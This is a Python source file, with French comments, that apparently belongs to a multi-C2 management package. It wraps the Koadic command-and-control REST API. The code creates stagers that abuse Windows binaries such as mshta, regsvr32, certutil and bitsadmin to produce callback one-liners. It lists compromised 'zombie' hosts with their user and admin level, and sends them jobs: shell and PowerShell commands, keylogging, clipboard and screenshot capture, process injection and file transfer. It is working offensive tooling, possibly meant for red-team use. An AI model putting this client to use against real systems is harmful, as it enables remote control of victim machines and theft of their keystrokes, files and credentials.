"""
Koadic — COM/JScript stagers via API REST Python (Flask, port 9999).

Koadic (github.com/zerosum0x0/koadic) — C2 basé sur WScript/JScript COM.
Port REST  : 9999 (Flask, pas d'auth par défaut — localhost uniquement)
Stagers    : mshta, wscript, cscript, regsvr32, rundll32
Zombies    : sessions actives (implants JScript)

Endpoints REST :
  GET  /api/stagers               → liste des stagers disponibles
  POST /api/stagers/{name}/run    → créer un stager (listener)
  GET  /api/sessions              → liste des zombies (agents)
  GET  /api/sessions/{id}         → détail zombie
  POST /api/sessions/{id}/job     → envoyer un job (commande)
  GET  /api/sessions/{id}/jobs    → historique des jobs
  GET  /api/jobs/{id}             → résultat d'un job
  GET  /api/modules               → modules disponibles
  POST /api/modules/{name}/run    → exécuter un module sur un zombie
  GET  /api/implants              → implants générés
  POST /api/kill/{id}             → tuer une session

Auth : aucune par défaut (Koadic écoute en local).
       Si API key configurée : header X-API-Key.
"""
from __future__ import annotations

import logging
import uuid
from datetime import datetime
from typing import Any

import httpx

from c2_manager.interfaces import RestC2Interface, C2AuthError
from c2_manager.models import C2Config, C2Status, Listener, Implant, Task, PayloadConfig

logger = logging.getLogger(__name__)


class KoadicC2(RestC2Interface):
    """
    Koadic C2 — REST API Flask locale.

    Paramètres extra (config.extra) :
      api_key    : str   — clé API (si configurée)
      verify_ssl : bool  (défaut: False)
    """

    CAPABILITIES = [
        "list_agents", "send_task", "create_listener", "remove_listener",
        "generate_payload", "list_modules", "run_module", "kill_session",
        "screenshot", "clipboard", "keylog", "powershell",
    ]

    # ── Auth ──────────────────────────────────────────────────────────────────

    async def _authenticate(self, config: C2Config) -> str:
        # Koadic n'a pas d'auth JWT. Retourner l'API key si présente.
        api_key = config.extra.get("api_key", "")
        if api_key:
            return api_key
        # Vérifier que l'API répond (health check)
        async with httpx.AsyncClient(
            base_url=config.base_url,
            verify=config.extra.get("verify_ssl", False),
            timeout=10.0,
        ) as client:
            resp = await client.get("/api/stagers")
            if resp.status_code not in (200, 401, 403):
                raise C2AuthError(f"Koadic API inaccessible [{resp.status_code}]")
        return api_key or "no-auth"

    def _build_client(self, config: C2Config) -> httpx.AsyncClient:
        """Override pour ajouter X-API-Key si disponible."""
        api_key = config.extra.get("api_key", "")
        headers: dict[str, str] = {}
        if api_key and api_key != "no-auth":
            headers["X-API-Key"] = api_key
        return httpx.AsyncClient(
            base_url=config.base_url,
            verify=config.extra.get("verify_ssl", False),
            timeout=30.0,
            headers=headers,
        )

    async def get_status(self) -> C2Status:
        if not self._client:
            return C2Status.DISCONNECTED
        try:
            resp = await self._client.get("/api/sessions", timeout=5.0)
            return C2Status.CONNECTED if resp.status_code == 200 else C2Status.ERROR
        except Exception:
            return C2Status.ERROR

    # ── Listeners (stagers) ───────────────────────────────────────────────────

    # Stagers Koadic disponibles
    _STAGER_TYPES = [
        "cmd/mshta",         # mshta.exe (HTML Application)
        "cmd/wscript",       # wscript.exe
        "cmd/cscript",       # cscript.exe
        "cmd/regsvr32",      # regsvr32.exe (scriptlet)
        "cmd/rundll32",      # rundll32.exe
        "cmd/powershell",    # PowerShell encoded command
        "cmd/bitsadmin",     # bitsadmin BITS job
        "cmd/certutil",      # certutil -decode
        "cmd/sct",           # regsvr32 SCT
        "cmd/wmic",          # WMIC aliaslist
    ]

    async def create_listener(self, config: dict[str, Any]) -> Listener:
        self._require_connected()
        stager_type = config.get("stager_type", "cmd/mshta")
        host        = config.get("callback_host", self._config.host)
        port        = int(config.get("callback_port", config.get("bind_port", 80)))
        name        = config.get("name", f"koadic-{stager_type.replace('/', '-')}")

        # Koadic : créer un stager via POST /api/stagers/{name}/run
        stager_name = stager_type.replace("/", "_")
        body = {
            "SRVHOST":  host,
            "SRVPORT":  str(port),
            "ENDPOINT": config.get("endpoint", f"/{uuid.uuid4().hex[:8]}"),
            "USERAGENT": config.get("user_agent", "Mozilla/5.0"),
            "EXPIRES":  config.get("expires", ""),
        }

        try:
            data = await self._post(f"/api/stagers/{stager_name}/run", json=body)
        except Exception:
            # Fallback : POST /api/stagers avec le nom
            data = await self._post("/api/stagers", json={"name": stager_type, **body})

        sid = str(data.get("id") or data.get("stager_id") or uuid.uuid4())
        return Listener(
            id=sid,
            name=name,
            c2_type=self._config.c2_type,
            bind_host=host,
            bind_port=port,
            protocol=stager_type,
            status="running" if data.get("active", True) else "stopped",
            meta={
                "stager_type": stager_type,
                "endpoint":    body["ENDPOINT"],
                "payload_url": data.get("payload_url", ""),
                "one_liner":   data.get("one_liner") or data.get("cmd", ""),
            },
        )

    async def remove_listener(self, listener_id: str) -> bool:
        self._require_connected()
        try:
            resp = await self._client.delete(f"/api/stagers/{listener_id}")
            if resp.status_code == 404:
                resp = await self._client.post(f"/api/stagers/{listener_id}/stop")
            return resp.status_code in (200, 204)
        except Exception as exc:
            logger.error("Koadic remove stager : %s", exc)
            return False

    async def list_listeners(self) -> list[Listener]:
        self._require_connected()
        data  = await self._get("/api/stagers")
        items = data if isinstance(data, list) else data.get("stagers", [])
        return [
            Listener(
                id=str(s.get("id") or s.get("stager_id") or uuid.uuid4()),
                name=s.get("name") or s.get("type", ""),
                c2_type=self._config.c2_type,
                bind_host=s.get("SRVHOST") or s.get("host", "0.0.0.0"),
                bind_port=int(s.get("SRVPORT") or s.get("port", 80)),
                protocol=s.get("type") or s.get("stager_type", "cmd/mshta"),
                status="running" if s.get("active", True) else "stopped",
                meta={"one_liner": s.get("one_liner") or s.get("cmd", "")},
            )
            for s in items
        ]

    # ── Agents (zombies) ──────────────────────────────────────────────────────

    async def list_agents(self) -> list[Implant]:
        self._require_connected()
        data  = await self._get("/api/sessions")
        items = data if isinstance(data, list) else data.get("sessions", [])
        return [self._parse_zombie(z) for z in items]

    def _parse_zombie(self, z: dict[str, Any]) -> Implant:
        zid = str(z.get("id") or z.get("session_id") or uuid.uuid4())

        def _dt(v: Any) -> datetime:
            if isinstance(v, (int, float)):
                try:
                    return datetime.utcfromtimestamp(v / 1000 if v > 1e10 else v)
                except Exception:
                    return datetime.utcnow()
            if isinstance(v, str):
                for fmt in ("%Y-%m-%dT%H:%M:%S", "%Y-%m-%d %H:%M:%S"):
                    try:
                        return datetime.strptime(v[:19], fmt)
                    except ValueError:
                        continue
            return datetime.utcnow()

        # Koadic stocke l'intégrité dans "HIGH_INTEGRITY" (bool) ou "integrity"
        is_admin = z.get("HIGH_INTEGRITY") or z.get("high_integrity") or z.get("admin", False)
        integrity = "ADMIN" if is_admin else "USER"

        return Implant(
            id=zid,
            name=z.get("DOMAINNAME") and f"{z['DOMAINNAME']}\\{z.get('USERNAME', '')}" or z.get("hostname") or zid,
            c2_type=self._config.c2_type,
            listener_id=str(z.get("stager_id") or z.get("listener_id", "")),
            external_ip=z.get("external_ip", ""),
            internal_ip=z.get("IP") or z.get("ip_address", ""),
            hostname=z.get("COMPUTERNAME") or z.get("hostname", ""),
            username=z.get("USERNAME") or z.get("username", ""),
            os=z.get("OS") or z.get("os", ""),
            arch=z.get("ARCH") or z.get("arch", ""),
            pid=int(z.get("PID") or z.get("pid", 0)),
            process_name=z.get("process") or z.get("process_name", ""),
            integrity=integrity,
            last_checkin=_dt(z.get("last_seen") or z.get("checkin")),
            first_seen=_dt(z.get("created_at") or z.get("first_seen")),
            active=not bool(z.get("dead") or z.get("killed", False)),
            meta={
                "stager_type": z.get("stager_type", ""),
                "koadic_uri":  z.get("koadic_uri", ""),
            },
        )

    # ── Jobs (tâches) ─────────────────────────────────────────────────────────

    # Mapping → Koadic job types
    _JOB_TYPES: dict[str, str] = {
        "shell":      "cmd",
        "cmd":        "cmd",
        "ps":         "powershell",
        "powershell": "powershell",
        "upload":     "upload",
        "download":   "download",
        "screenshot": "screenshot",
        "clipboard":  "clipboard",
        "keylog":     "keylogger",
        "sysinfo":    "sysinfo",
        "whoami":     "whoami",
        "ls":         "ls",
        "ps_list":    "ps",
        "inject":     "inject",
        "zombie":     "zombie",  # créer un nouveau zombie depuis une session
        "exit":       "exit",
    }

    async def send_task(
        self,
        agent_id: str,
        command:  str,
        args:     list[str] | None = None,
    ) -> Task:
        self._require_connected()
        args_list = args or []
        cmd_parts = command.split()
        cmd_lower = cmd_parts[0].lower() if cmd_parts else "cmd"
        job_type  = self._JOB_TYPES.get(cmd_lower, "cmd")
        extra     = cmd_parts[1:] + args_list

        body = {
            "type":      job_type,
            "command":   " ".join(extra) if extra else command,
            "arguments": extra,
        }

        data = await self._post(f"/api/sessions/{agent_id}/job", json=body)
        return Task(
            id=str(data.get("id") or data.get("job_id") or uuid.uuid4()),
            agent_id=agent_id,
            c2_type=str(self._config.c2_type),
            command=command,
            args=args_list,
            status=data.get("status", "queued"),
            meta={"job_type": job_type},
        )

    async def get_task_result(self, task_id: str) -> dict[str, Any]:
        self._require_connected()
        data = await self._get(f"/api/jobs/{task_id}")
        return {
            "task_id": task_id,
            "status":  data.get("status"),
            "output":  data.get("output") or data.get("result", ""),
        }

    # ── Payload (one-liner stager) ────────────────────────────────────────────

    async def generate_payload(self, config: PayloadConfig) -> bytes:
        self._require_connected()
        stager = config.extra.get("stager_type", "cmd/mshta")
        host   = config.extra.get("callback_host", self._config.host)
        port   = int(config.extra.get("port", 80))

        stager_name = stager.replace("/", "_")
        try:
            data = await self._post(f"/api/stagers/{stager_name}/run", json={
                "SRVHOST": host, "SRVPORT": str(port),
                "ENDPOINT": f"/{uuid.uuid4().hex[:8]}",
            })
        except Exception:
            return b""

        one_liner = data.get("one_liner") or data.get("cmd", "")
        return one_liner.encode() if one_liner else b""

    # ── Modules ───────────────────────────────────────────────────────────────

    async def list_modules(self) -> list[dict[str, Any]]:
        self._require_connected()
        data  = await self._get("/api/modules")
        items = data if isinstance(data, list) else data.get("modules", [])
        return [
            {"name": m.get("name", ""), "description": m.get("description", ""),
             "options": m.get("options", {})} for m in items
        ]

    async def run_module(
        self, session_id: str, module_name: str, options: dict[str, Any]
    ) -> Task:
        self._require_connected()
        module_path = module_name.replace(".", "/")
        data = await self._post(f"/api/modules/{module_path}/run", json={
            "session_id": session_id, **options
        })
        return Task(
            id=str(data.get("id") or data.get("job_id") or uuid.uuid4()),
            agent_id=session_id,
            c2_type=str(self._config.c2_type),
            command=f"module:{module_name}",
            status=data.get("status", "queued"),
            meta={"module": module_name},
        )

    async def kill_session(self, session_id: str) -> bool:
        self._require_connected()
        try:
            resp = await self._client.post(f"/api/kill/{session_id}")
            return resp.status_code in (200, 204)
        except Exception:
            return False

    async def get_capabilities(self) -> list[str]:
        return self.CAPABILITIES
